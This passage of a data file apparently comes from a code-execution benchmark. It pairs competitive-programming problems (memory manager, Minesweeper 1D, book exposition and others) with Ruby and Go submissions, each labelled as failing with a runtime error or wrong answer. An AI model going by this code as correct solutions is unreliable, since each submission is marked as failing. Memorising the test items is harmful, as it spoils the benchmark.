\"ILLEGAL_ERASE_ARGUMENT\"\n\t\t\telse\n\t\t\t\tidentifiers.delete(d_iden)\n\t\t\t\tmemory_blocks.delete(iden_index)\n\t\t\t\tputs \"memory_blocks is #{memory_blocks}\"\n\t\t\t\tputs \"identifiers is #{identifiers}\"\n\t\t\tend\n\t\telse # defragment\n\t\t\tstart_index = 0\n\t\t\tcopy = {}\n\t\t\tmemory_blocks.size.times do\n\t\t\t\tlowest = memory_blocks.min\n\t\t\t\tcopy[start_index] = lowest[1]\n\t\t\t\tidentifiers[identifiers.key(lowest[0])] = start_index\n\t\t\t\tstart_index += lowest[1]\n\t\t\t\tmemory_blocks.delete(lowest[0])\n\t\t\tend\n\t\t\tmemory_blocks = copy\n\t\t\tputs \"memory_blocks is #{memory_blocks}\"\n\t\t\tputs \"identifiers is #{identifiers}\"\n\t\tend\nend\n","description":"There is little time left before the release of the first national operating system BerlOS. Some of its components are not finished yet \u2014 the memory manager is among them. According to the developers' plan, in the first release the memory manager will be very simple and rectilinear. It will support three operations:   alloc n \u2014 to allocate n bytes of the memory and return the allocated block's identifier x;  erase x \u2014 to erase the block with the identifier x;  defragment \u2014 to defragment the free memory, bringing all the blocks as close to the beginning of the memory as possible and preserving their respective order; The memory model in this case is very simple. It is a sequence of m bytes, numbered for convenience from the first to the m-th.The first operation alloc n takes as the only parameter the size of the memory block that is to be allocated. While processing this operation, a free block of n successive bytes is being allocated in the memory. If the amount of such blocks is more than one, the block closest to the beginning of the memory (i.e. to the first byte) is prefered. All these bytes are marked as not free, and the memory manager returns a 32-bit integer numerical token that is the identifier of this block. If it is impossible to allocate a free block of this size, the function returns NULL.The second operation erase x takes as its parameter the identifier of some block. This operation frees the system memory, marking the bytes of this block as free for further use. In the case when this identifier does not point to the previously allocated block, which has not been erased yet, the function returns ILLEGAL_ERASE_ARGUMENT.The last operation defragment does not have any arguments and simply brings the occupied memory sections closer to the beginning of the memory without changing their respective order.In the current implementation you are to use successive integers, starting with 1, as identifiers. Each successful alloc operation procession should return following number. Unsuccessful alloc operations do not affect numeration.You are to write the implementation of the memory manager. You should output the returned value for each alloc command. You should also output ILLEGAL_ERASE_ARGUMENT for all the failed erase commands.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two positive integers t and m (1\u2009\u2264\u2009t\u2009\u2264\u2009100;1\u2009\u2264\u2009m\u2009\u2264\u2009100), where t \u2014 the amount of operations given to the memory manager for processing, and m \u2014 the available memory size in bytes. Then there follow t lines where the operations themselves are given. The first operation is alloc n (1\u2009\u2264\u2009n\u2009\u2264\u2009100), where n is an integer. The second one is erase x, where x is an arbitrary 32-bit integer numerical token. The third operation is defragment. ","output_spec":"Output the sequence of lines. Each line should contain either the result of alloc operation procession , or ILLEGAL_ERASE_ARGUMENT as a result of failed erase operation procession. Output lines should go in the same order in which the operations are processed. Successful procession of alloc operation should return integers, starting with 1, as the identifiers of the allocated blocks.","notes":null,"sample_inputs":["6 10\nalloc 5\nalloc 3\nerase 1\nalloc 6\ndefragment\nalloc 6"],"sample_outputs":["1\n2\nNULL\n3"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"b263917e47e1c84340bcb1c77999fd7e","submission_id":"re_730","tags":["constructive algorithms","greedy","math","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n = gets.to_i\narr = gets.split(\" \").map(&:to_i).sort.reverse\nans = nil\nif arr.include?(0)\n\tsum = arr.inject(0,:+)\n\tif sum % 3 == 0\n\t\tans = arr.join(\"\")\n\telsif sum % 3 == 1\n\t\t\n\t\tone = [1,4,7]\n\t\ttwo = [2,5,8]\n\t\tl = nil\n\t\tone.each do |o|\n\t\t\tl = arr.rindex(o)\n\t\t\tif l\n\t\t\t\tarr.delete_at(l)\n\t\t\t\tbreak\n\t\t\tend\n\t\tend\n\n\t\tunless l\n\t\t\tdeleted = 0\n\t\t\ttwo.each do |t|\n\t\t\t\tl = arr.rindex(t)\n\t\t\t\tif l \n\t\t\t\t\tif deleted == 0\n\t\t\t\t\t\tl1 = arr.index(t)\n\t\t\t\t\t\tif l == l1\n\t\t\t\t\t\t\tarr.delete_at(l)\n\t\t\t\t\t\t\tdeleted = 1\n\t\t\t\t\t\t\tnext\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tarr.delete_at(l)\n\t\t\t\t\t\t\tarr.delete_at(l1)\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\tend\n\t\t\t\t\tend\n\n\t\t\t\t\tif deleted == 1\n\t\t\t\t\t\tarr.delete_at(l)\n\t\t\t\t\tend\n\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\n\t\t# j = arr.length - 1\n\t\t# while j >= 0\n\t\t# \ta = arr[j]\n\t\t\t\n\t\t# \tif a % 3 == 1 && one.length < 1\n\t\t# \t\tone << j \n\t\t# \t\tbreak\n\t\t# \tend\n\t\t\t\n\t\t# \tif a % 3 == 2  && two.length < 2\n\t\t# \t\ttwo << j\n\t\t# \tend\n\t\t# \tj -= 1\t\t\t\n\t\t# end\n\t\t# if one.empty?\n\t\t# \tarr.delete_at(two[0])\n\t\t# \tarr.delete_at(two[1])\n\t\t# else\n\t\t# \tarr.delete_at(one[0])\n\t\t# end\n\n\n\t\t# puts \"here\"\n\t\t# l = arr.rindex{|a| a % 3 == 1}\n\t\t# if l\n\t\t# \tarr.delete_at(l)\n\t\t# else\n\t\t# \tl = arr.rindex{|a| a % 3 == 2}\n\t\t# \tarr.delete_at(l)\n\t\t# \tl = arr.rindex{|a| a % 3 == 2}\n\t\t# \tarr.delete_at(l)\n\t\t# end\n\telse\n\n\t\t\n\t\tone = [1,4,7]\n\t\ttwo = [2,5,8]\n\t\tl = nil\n\t\ttwo.each do |o|\n\t\t\tl = arr.rindex(o)\n\t\t\tif l\n\t\t\t\tarr.delete_at(l)\n\t\t\t\tbreak\n\t\t\tend\n\t\tend\n\n\t\tunless l\n\t\t\tdeleted = 0\n\t\t\tone.each do |t|\n\t\t\t\tl = arr.rindex(t)\n\t\t\t\tif l \n\t\t\t\t\tif deleted == 0\n\t\t\t\t\t\tl1 = arr.index(t)\n\t\t\t\t\t\tif l == l1\n\t\t\t\t\t\t\tarr.delete_at(l)\n\t\t\t\t\t\t\tdeleted = 1\n\t\t\t\t\t\t\tnext\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tarr.delete_at(l)\n\t\t\t\t\t\t\tarr.delete_at(l1)\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\tend\n\t\t\t\t\tend\n\n\t\t\t\t\tif deleted == 1\n\t\t\t\t\t\tarr.delete_at(l)\n\t\t\t\t\tend\n\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\n\n\t\t# one = [1,4,7]\n\t\t# two = [2,5,8]\n\t\t# j = arr.length - 1\n\t\t# while j >= 0\n\t\t# \ta = arr[j]\n\t\t\t\n\t\t# \tif a % 3 == 2 && two.length < 1\n\t\t# \t\ttwo << j \n\t\t# \t\tbreak\n\t\t# \tend\n\t\t\t\n\t\t# \tif a % 3 == 1  && one.length < 2\n\t\t# \t\tone << j\n\t\t# \tend\n\t\t# \tj -= 1\t\t\t\n\t\t# end\n\t\t# if two.empty?\n\t\t# \tarr.delete_at(one[0])\n\t\t# \tarr.delete_at(one[1])\n\t\t# else\n\t\t# \tarr.delete_at(two[0])\n\t\t# end\n\n\n\t\t# l = arr.rindex{|a| a % 3 == 2}\n\t\t# if l\n\t\t# \tarr.delete_at(l)\n\t\t# else\n\t\t# \tl = arr.rindex{|a| a % 3 == 1}\n\t\t# \tarr.delete_at(l)\n\t\t# \tl = arr.rindex{|a| a % 3 == 1}\n\t\t# \tarr.delete_at(l)\n\t\t# end\n\tend\n\tans = arr.join(\"\")\n\tif ans.to_i == 0\n\t\tputs \"0\"\n\telse\n\t\tputs ans\n\tend\nelse\n\tputs \"-1\"\nend","description":"Furik loves math lessons very much, so he doesn't attend them, unlike Rubik. But now Furik wants to get a good mark for math. For that Ms. Ivanova, his math teacher, gave him a new task. Furik solved the task immediately. Can you?You are given a set of digits, your task is to find the maximum integer that you can make from these digits. The made number must be divisible by 2, 3, 5 without a residue. It is permitted to use not all digits from the set, it is forbidden to use leading zeroes.Each digit is allowed to occur in the number the same number of times it occurs in the set.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100000) \u2014 the number of digits in the set. The second line contains n digits, the digits are separated by a single space. ","output_spec":"On a single line print the answer to the problem. If such number does not exist, then you should print -1.","notes":"NoteIn the first sample there is only one number you can make \u2014 0. In the second sample the sought number is 5554443330. In the third sample it is impossible to make the required number.","sample_inputs":["1\n0","11\n3 4 5 4 5 3 5 3 4 4 0","8\n3 2 5 1 5 2 2 3"],"sample_outputs":["0","5554443330","-1"]}
{"difficulty":1900,"lang":"Ruby","lang_cluster":"ruby","src_uid":"bc8b4b74c2f2d486e2d2f03982ef1013","submission_id":"re_1055","tags":["two pointers","dsu","data structures","binary search","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"number_of_books,limit_height = gets.split.collect! {|x| x.to_i}\n\nbooks_height = []\nbooks_height = gets.split.collect! {|x| x.to_i}\n\nmax_books = 1\nresult = []\nmax_h = min_h = books_height[0]\nmax_i = min_i = 0\nmax_sub_h = 0\nmin_sub_h = 1000000\nmax_sub_i = min_sub_i = 0\ncount = 0\ni = 0\nwhile i < number_of_books\n#(number_of_books).times do |i|\n#    count = i + 1\n#    max_h = min_h = books_height[i]\n#    max_i = min_i = count - 1\n    if max_sub_i > i\n        max_h = max_sub_h\n        max_i = max_sub_i\n    else\n        max_h = books_height[i]\n        max_i = i\n        count = i + 1\n    end\n    if min_sub_i > i\n        min_h = min_sub_i\n        min_i = min_sub_i\n    else\n        min_h = books_height[i]\n        min_i = i\n        count = i + 1\n    end\n    max_sub_h = 0\n    min_sub_h = 1000000\n    max_sub_i = min_sub_i = 0\n    while count < number_of_books\n        if max_h <= books_height[count]\n            max_h = books_height[count]\n            max_i = count\n        elsif min_h >= books_height[count]\n            min_h = books_height[count]\n            min_i = count\n        elsif max_i < min_i && max_sub_h < max_h\n            max_sub_h = books_height[count]\n            max_sub_i = count\n        elsif min_i < max_i && min_sub_h > min_h\n            min_sub_h = books_height[count]\n            min_sub_i = count\n        end\n        if (max_h - min_h).abs > limit_height\n            break\n        end\n        count += 1\n    end\n    if count - i >= max_books\n        if count - i > max_books\n            result.clear\n        end\n        max_books = count - i\n        result.push [i + 1,count]\n    end\n    if count == number_of_books || number_of_books - i <= max_books\n        break\n    elsif max_i >= min_i\n        i = min_i + 1\n    elsif min_i > max_i\n        i = max_i + 1\n    else\n        i += 1\n    end\nend\nputs max_books.to_s + ' ' + result.length.to_s\nresult.length.times do |i|\n    puts result[i][0].to_s + ' ' + result[i][1].to_s\nend\n\n","description":"There are several days left before the fiftieth birthday of a famous Berland's writer Berlbury. In this connection the local library decided to make an exposition of the works of this famous science-fiction writer. It was decided as well that it is necessary to include into the exposition only those books that were published during a particular time period. It is obvious that if the books differ much in size, the visitors will not like it. That was why the organizers came to the opinion, that the difference between the highest and the lowest books in the exposition should be not more than k millimeters.The library has n volumes of books by Berlbury, arranged in chronological order of their appearance. The height of each book in millimeters is know, it is hi. As Berlbury is highly respected in the city, the organizers want to include into the exposition as many books as possible, and to find out what periods of his creative work they will manage to cover. You are asked to help the organizers cope with this hard task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two integer numbers separated by a space n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) and k (0\u2009\u2264\u2009k\u2009\u2264\u2009106) \u2014 the amount of books by Berlbury in the library, and the maximum allowed height difference between the lowest and the highest books. The second line contains n integer numbers separated by a space. Each number hi (1\u2009\u2264\u2009hi\u2009\u2264\u2009106) is the height of the i-th book in millimeters.","output_spec":"In the first line of the output data print two numbers a and b (separate them by a space), where a is the maximum amount of books the organizers can include into the exposition, and b \u2014 the amount of the time periods, during which Berlbury published a books, and the height difference between the lowest and the highest among these books is not more than k milllimeters. In each of the following b lines print two integer numbers separated by a space \u2014 indexes of the first and the last volumes from each of the required time periods of Berlbury's creative work.","notes":null,"sample_inputs":["3 3\n14 12 10","2 0\n10 10","4 5\n8 19 10 13"],"sample_outputs":["2 2\n1 2\n2 3","2 1\n1 2","2 1\n3 4"]}
{"difficulty":1900,"lang":"Ruby","lang_cluster":"ruby","src_uid":"c16c49baf7b2d179764871204475036e","submission_id":"re_1133","tags":["dp","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"s = gets.chomp!\nmods = 1000000007\ndp = [[0,0,0],[0,0,0]]\n\nlen =s.size\ncur =0;nxt=1;\n\ncase s[0]\nwhen '0'\n\tdp[cur][0]=1\nwhen '1'\n\tdp[cur][1]=1\nwhen '2'\n\tp 0\n\texit\nwhen '*'\n\tdp[cur][2]=1\nwhen '?'\n\tdp[cur][0]=dp[cur][1]=dp[cur][2]=1\nend\n\nfor i in 1...len\n\tcase s[i]\n\twhen '0'\n\t\tdp[nxt][0]=dp[cur][0]\n\twhen '1'\n\t\tdp[nxt][1]= dp[cur][0]\n\t\tdp[nxt][0]= dp[cur][2]\n\twhen '2'\n\t\tdp[nxt][1]=dp[cur][2]\n\twhen '*'\n\t\tdp[nxt][2]= (dp[cur][1]+dp[cur][2])\n\twhen '?'\n\t\tdp[nxt][1]= (dp[cur][2]+dp[cur][0])\n\t\tdp[nxt][0]= (dp[cur][0]+dp[cur][2])\n\t\tdp[nxt][2]= (dp[cur][1]+dp[cur][2])\n\tend\n\ta = cur \n\tcur = nxt\n\tnxt = a\n\tdp[nxt] = [0,0,0]\nend\n\nputs \"#{(dp[cur][0]+dp[cur][2])%mods}\"","description":"Game \"Minesweeper 1D\" is played on a line of squares, the line's height is 1 square, the line's width is n squares. Some of the squares contain bombs. If a square doesn't contain a bomb, then it contains a number from 0 to 2 \u2014 the total number of bombs in adjacent squares.For example, the correct field to play looks like that: 001*2***101*. The cells that are marked with \"*\" contain bombs. Note that on the correct field the numbers represent the number of bombs in adjacent cells. For example, field 2* is not correct, because cell with value 2 must have two adjacent cells with bombs.Valera wants to make a correct field to play \"Minesweeper 1D\". He has already painted a squared field with width of n cells, put several bombs on the field and wrote numbers into some cells. Now he wonders how many ways to fill the remaining cells with bombs and numbers are there if we should get a correct field in the end.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains sequence of characters without spaces s1s2... sn (1\u2009\u2264\u2009n\u2009\u2264\u2009106), containing only characters \"*\", \"?\" and digits \"0\", \"1\" or \"2\". If character si equals \"*\", then the i-th cell of the field contains a bomb. If character si equals \"?\", then Valera hasn't yet decided what to put in the i-th cell. Character si, that is equal to a digit, represents the digit written in the i-th square.","output_spec":"Print a single integer \u2014 the number of ways Valera can fill the empty cells and get a correct field. As the answer can be rather large, print it modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first test sample you can get the following correct fields: 001**1, 001***, 001*2*, 001*10.","sample_inputs":["?01???","?","**12","1"],"sample_outputs":["4","2","0","0"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"d3a0402de1338a1a542a86ac5b484acc","submission_id":"re_1485","tags":["dp","number theory","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/bin\/env\/ruby\n\ndef exec(debug = false)\n  length = gets.chomp.to_i\n  elements = gets.chomp.split(\/\\s\/).map{|s| s.to_i}\n  return puts \"NO\" unless length == elements.size\n  \n  max = length \/ 3\n  p \"max: #{max}\" if debug\n  max.times do |i|\n    ii = i + 1\n    p \"ii: #{ii}\" if debug\n    next if length % ii != 0\n    elements.each_with_index do |e, index|\n      break if index == max\n      success = true\n      next if e == 0\n      next if index >= ii\n      p \"index:#{index}\" if debug\n      (index + ii).step(length - 1, ii) do |j|\n        p \"j: #{j}\" if debug\n        unless elements[j] == 1\n          p \"break\" if debug\n          success = false\n          break\n        end\n      end\n      return puts(\"YES\") if success\n    end\n  end\n  puts \"NO\"\nend\n\nexec(debug = true)\n#exec\n","description":"There are n knights sitting at the Round Table at an equal distance from each other. Each of them is either in a good or in a bad mood.Merlin, the wizard predicted to King Arthur that the next month will turn out to be particularly fortunate if the regular polygon can be found. On all vertices of the polygon knights in a good mood should be located. Otherwise, the next month will bring misfortunes.A convex polygon is regular if all its sides have same length and all his angles are equal. In this problem we consider only regular polygons with at least 3 vertices, i. e. only nondegenerated.On a picture below some examples of such polygons are present. Green points mean knights in a good mood. Red points mean ones in a bad mood.  King Arthur knows the knights' moods. Help him find out if the next month will be fortunate or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n, which is the number of knights at the round table (3\u2009\u2264\u2009n\u2009\u2264\u2009105). The second line contains space-separated moods of all the n knights in the order of passing them around the table. \"1\" means that the knight is in a good mood an \"0\" means that he is in a bad mood.","output_spec":"Print \"YES\" without the quotes if the following month will turn out to be lucky. Otherwise, print \"NO\".","notes":null,"sample_inputs":["3\n1 1 1","6\n1 0 1 1 1 0","6\n1 0 0 1 0 1"],"sample_outputs":["YES","YES","NO"]}
{"difficulty":2500,"lang":"Ruby","lang_cluster":"ruby","src_uid":"e7e0f9069166fe992abe6f0e19caa6a1","submission_id":"9ee4256c11341f41dbbbd730a6233a27","tags":["data structures","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/bin\/env ruby\nclass Integer\n  def min(x)\n    self < x ? self : x\n  end\nend\nn = gets.to_i\na = gets.split.map { |x| x.to_i }\nb = (0...n).to_a.sort_by { |x| a[x] }\nls = []; nx = []\nl = 0; r = n - 1\nn.times do |i|\n  ls[i] = i - 1\n  nx[i] = i + 1\nend\nans = 0\nb.each_with_index do |i, ix|\n  break if ix > n - 2\n  if i == l\n    ans += a[i]\n    l = nx[l]\n  elsif i == r\n    ans += a[i]\n    r = ls[r]\n  else\n    ans += a[ls[i]].min(a[nx[i]])\n    nx[ls[i]] = nx[i]\n    ls[nx[i]] = ls[i]\n  end\nend\nputs ans\n","description":"Artem has an array of n positive integers. Artem decided to play with it. The game consists of n moves. Each move goes like this. Artem chooses some element of the array and removes it. For that, he gets min(a,\u2009b) points, where a and b are numbers that were adjacent with the removed number. If the number doesn't have an adjacent number to the left or right, Artem doesn't get any points. After the element is removed, the two parts of the array glue together resulting in the new array that Artem continues playing with. Borya wondered what maximum total number of points Artem can get as he plays this game.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095\u00b7105) \u2014 the number of elements in the array. The next line contains n integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the values of the array elements.","output_spec":"In a single line print a single integer \u2014 the maximum number of points Artem can get.","notes":null,"sample_inputs":["5\n3 1 5 2 6","5\n1 2 3 4 5","5\n1 100 101 100 1"],"sample_outputs":["11","6","102"]}
{"difficulty":1800,"lang":"Ruby","lang_cluster":"ruby","src_uid":"e9c486e2d942700e0644dff29b6e3be6","submission_id":"re_767","tags":["implementation","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"class Spell\n\tdef initialize(idx, power, dmg)\n\t\t@idx = idx\n\t\t@power = power\n\t\t@dmg = dmg\n\t\t@used = false\n\tend\n\tattr_accessor :idx, :power, :dmg, :used\nend\n\t\nn,mx,reg = gets.chomp.split(\/ \/).map!{|x|x.to_i}\nra = Array.new(n)\nret = true\nsa = Array.new\nfor i in 0..n-1\n\ta = gets.chomp.split(\/ \/).map!{|x|x.to_i}\n\tra[i] = Spell.new( i+1, a[0], a[1] )\nend\n\nra.sort!{|a,b| b.dmg <=> a.dmg }\n\nmxw = mx\ndmgpermin = 0\nmtime = 0\n\nwhile mxw > 0\n\tprevmxw = mxw\n\tnotfound = true\n\tfor i in 0..n-1\n\t\tnext if ra[i].used\n\t\tnext if ra[i].power*mx < mxw*100\n\t\tdmgpermin += ra[i].dmg\n\t\tra[i].used = true\n\t\tsa.push( mtime.to_s + \" \" + ra[i].idx.to_s )\n\t\tnotfound = false\n\t\tbreak\n\tend\n\tmxw -= dmgpermin\n\tmxw += reg\n\tmxw = mx if mxw > mx\n\n\tbreak if mxw < 0\n\n\tmtime += 1\n\n\tif notfound && prevmxw <= mxw\n\t\tret = false\n\t\tbreak\n\tend\nend\n\nret = false if mxw > 0\n\nif ret\n\tputs \"YES\"\n\tputs mtime.to_s + \" \" + sa.length.to_s\n\tsa.each{|x| puts x }\nelse\n\tputs \"NO\"\nend","description":"Vasya\u2019s elder brother Petya loves playing computer games. In one of his favourite computer games Petya reached the final level where a fight with the boss take place.While playing the game Petya found spell scrolls and now he is about to use them. Let\u2019s describe the way fighting goes on this level:1) The boss has two parameters: max \u2014 the initial amount of health and reg \u2014 regeneration rate per second.2) Every scroll also has two parameters: powi \u2014 spell power measured in percents \u2014 the maximal amount of health counted off the initial one, which allows to use the scroll (i.e. if the boss has more than powi percent of health the scroll cannot be used); and dmgi the damage per second inflicted upon the boss if the scroll is used. As soon as a scroll is used it disappears and another spell is cast upon the boss that inflicts dmgi of damage per second upon him until the end of the game.During the battle the actions per second are performed in the following order: first the boss gets the damage from all the spells cast upon him, then he regenerates reg of health (at the same time he can\u2019t have more than max of health), then the player may use another scroll (no more than one per second).The boss is considered to be defeated if at the end of a second he has nonpositive (\u2009\u2264\u20090) amount of health.Help Petya to determine whether he can win with the set of scrolls available to him and if he can, determine the minimal number of seconds he needs to do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers N, max and reg (1\u2009\u2264\u2009N,\u2009max,\u2009reg\u2009\u2264\u20091000) \u2013\u2013 the amount of scrolls and the parameters of the boss. The next N lines contain two integers powi and dmgi each \u2014 the parameters of the i-th scroll (0\u2009\u2264\u2009powi\u2009\u2264\u2009100, 1\u2009\u2264\u2009dmgi\u2009\u2264\u20092000). ","output_spec":"In case Petya can\u2019t complete this level, output in the single line NO. Otherwise, output on the first line YES. On the second line output the minimal time after which the boss can be defeated and the number of used scrolls. In the next lines for each used scroll output space-separated number of seconds passed from the start of the battle to the moment the scroll was used and the number of the scroll. Scrolls are numbered starting from 1 in the input order. The first scroll is considered to be available to be used after 0 seconds. Output scrolls in the order they were used. It is not allowed to use scrolls after the boss is defeated.","notes":null,"sample_inputs":["2 10 3\n100 3\n99 1","2 100 10\n100 11\n90 9"],"sample_outputs":["NO","YES\n19 2\n0 1\n10 2"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"fbfc333ad4b0a750f654a00be84aea67","submission_id":"re_1566","tags":["graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"#! ruby\n# Try Codeforces\n# author: Leonardone @ NEETSDKASU\n\ndef gi(); gets.to_i; end\ndef gis(); gets.chomp.split.map(&:to_i); end\n\nn, m = gis\n\nh = []\n1.upto(n) do |i|\n    h[i] = [-1] * n.succ\n    h[i][i] = 0\nend\n\nm.times do\n    u, v = gis\n    h[u][v] = h[v][u] = 1\nend\n\nt1 = []\nt2 = []\n1.upto(n) do |i|\n    t1[i] = []\n    t2[i] = []\n    1.upto(n) do |j|\n        case h[i][j]\n        when 1\n            t1[i] << j\n        when -1\n            t2[i] << j\n        end\n    end\nend\n\nif t1[1].empty? || t2[1].empty? || t1[n].empty? || t2[n].empty?\n    puts '-1'\n    exit\nend\n\nl1 = [1]\nv1 = [true] + ([false] * n)\nflg = true\nct = 0\nwhile flg && !l1.empty? do\n    ct += 1\n    l2 = []\n    l1.each do |k|\n        if t1[k][-1] == n\n            flg = false\n            break\n        end\n        t1[k].each do |x|\n            next if v1[x]\n            l2 << x\n        end\n    end\n    l1 = l2\nend    \n\nif flg\n    puts '-1'\n    exit\nend\n\n\nl1 = [1]\nv1 = [true] + ([false] * n)\nflg = true\ncb = 0\nwhile flg && !l1.empty? do\n    cb += 1\n    l2 = []\n    l1.each do |k|\n        if t2[k][-1] == n\n            flg = false\n            break\n        end\n        t2[k].each do |x|\n            next if v1[x]\n            l2 << x\n        end\n    end\n    l1 = l2\nend    \n\nif flg\n    puts '-1'\n    exit\nend\n\nputs [ct,cb].max\n\n","description":"In Absurdistan, there are n towns (numbered 1 through n) and m bidirectional railways. There is also an absurdly simple road network\u00a0\u2014 for each pair of different towns x and y, there is a bidirectional road between towns x and y if and only if there is no railway between them. Travelling to a different town using one railway or one road always takes exactly one hour.A train and a bus leave town 1 at the same time. They both have the same destination, town n, and don't make any stops on the way (but they can wait in town n). The train can move only along railways and the bus can move only along roads.You've been asked to plan out routes for the vehicles; each route can use any road\/railway multiple times. One of the most important aspects to consider is safety\u00a0\u2014 in order to avoid accidents at railway crossings, the train and the bus must not arrive at the same town (except town n) simultaneously.Under these constraints, what is the minimum number of hours needed for both vehicles to reach town n (the maximum of arrival times of the bus and the train)? Note, that bus and train are not required to arrive to the town n at the same moment of time, but are allowed to do so.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m (2\u2009\u2264\u2009n\u2009\u2264\u2009400, 0\u2009\u2264\u2009m\u2009\u2264\u2009n(n\u2009-\u20091)\u2009\/\u20092)\u00a0\u2014 the number of towns and the number of railways respectively. Each of the next m lines contains two integers u and v, denoting a railway between towns u and v (1\u2009\u2264\u2009u,\u2009v\u2009\u2264\u2009n, u\u2009\u2260\u2009v). You may assume that there is at most one railway connecting any two towns.","output_spec":"Output one integer\u00a0\u2014 the smallest possible time of the later vehicle's arrival in town n. If it's impossible for at least one of the vehicles to reach town n, output \u2009-\u20091.","notes":"NoteIn the first sample, the train can take the route  and the bus can take the route . Note that they can arrive at town 4 at the same time.In the second sample, Absurdistan is ruled by railwaymen. There are no roads, so there's no way for the bus to reach town 4.","sample_inputs":["4 2\n1 3\n3 4","4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4","5 5\n4 2\n3 5\n4 5\n5 1\n1 2"],"sample_outputs":["2","-1","3"]}
{"difficulty":1000,"lang":"Go","lang_cluster":"go","src_uid":"0515ac888937a4dda30cad5e2383164f","submission_id":"d88fbb7db3ee245383525e7d4cc56b84","tags":["implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ Author: sighduck\n\/\/ URL: https:\/\/codeforces.com\/contest\/1230\/problem\/B\n\npackage main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc _Solve(current int, n int, k int, S string) string {\n\tif n == 1 && k > 0 {\n\t\treturn \"0\"\n\t}\n\tif k == 0 || current == n {\n\t\treturn S\n\t}\n\tif current == 0 && string(S[current]) != \"1\" {\n\t\tk -= 1\n\t\tS = \"1\" + S[1:]\n\t} else if current != 0 && S[current] > 0 {\n\t\tk -= 1\n\t\tS = S[:current] + \"0\" + S[current+1:]\n\t}\n\treturn _Solve(current+1, n, k, S)\n}\n\nfunc Solve(n int, k int, S string) string {\n\treturn _Solve(0, n, k, S)\n}\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\twriter := bufio.NewWriter(os.Stdout)\n\tdefer writer.Flush()\n\n\tvar n, k int\n\tvar s string\n\tfmt.Fscanf(reader, \"%d %d\\n%s\\n\", &n, &k, &s)\n\n\tfmt.Fprintf(writer, \"%s\\n\", Solve(n, k, s))\n}\n","description":"Ania has a large integer $$$S$$$. Its decimal representation has length $$$n$$$ and doesn't contain any leading zeroes. Ania is allowed to change at most $$$k$$$ digits of $$$S$$$. She wants to do it in such a way that $$$S$$$ still won't contain any leading zeroes and it'll be minimal possible. What integer will Ania finish with?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\leq n \\leq 200\\,000$$$, $$$0 \\leq k \\leq n$$$) \u2014 the number of digits in the decimal representation of $$$S$$$ and the maximum allowed number of changed digits. The second line contains the integer $$$S$$$. It's guaranteed that $$$S$$$ has exactly $$$n$$$ digits and doesn't contain any leading zeroes.","output_spec":"Output the minimal possible value of $$$S$$$ which Ania can end with. Note that the resulting integer should also have $$$n$$$ digits.","notes":"NoteA number has leading zeroes if it consists of at least two digits and its first digit is $$$0$$$. For example, numbers $$$00$$$, $$$00069$$$ and $$$0101$$$ have leading zeroes, while $$$0$$$, $$$3000$$$ and $$$1010$$$ don't have leading zeroes.","sample_inputs":["5 3\n51528","3 2\n102","1 1\n1"],"sample_outputs":["10028","100","0"]}
{"difficulty":1400,"lang":"Go","lang_cluster":"go","src_uid":"08f1ba79ced688958695a7cfcfdda035","submission_id":"25f91ebea5ee3c1b49186dfd9cf5c964","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n)\n\nvar reader *bufio.Reader = bufio.NewReader(os.Stdin)\nvar writer *bufio.Writer = bufio.NewWriter(os.Stdout)\n\nfunc printf(f string, a ...interface{}) { fmt.Fprintf(writer, f, a...) }\nfunc scanf(f string, a ...interface{})  { fmt.Fscanf(reader, f, a...) }\n\nfunc min(a, b int) int {\n\tif a <= b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc printSlice(a []int) {\n\tprintf(\"  \")\n\tfor i := 0; i < len(a); i++ {\n\t\tprintf(\"%d \", a[i])\n\t}\n\tprintf(\"\\n\")\n}\n\nfunc main() {\n\tdefer writer.Flush()\n\tvar n int\n\tscanf(\"%d\\n\", &n)\n\ta := make([]int, n)\n\tfor i := 0; i < n; i++ {\n\t\tscanf(\"%d\", &a[i])\n\t}\n\t\/\/ printSlice(a)\n\tdp := make([]int, n+1)\n\ts := \"\"\n\tfor i := 1; i <= n; i++ {\n\t\tvar x, y, z int\n\t\tx = 1e5\n\t\ty = 1e5\n\t\tz = 1e5\n\t\tvar prev byte\n\t\tif i >= 2 {\n\t\t\tprev = s[i-2]\n\t\t} else 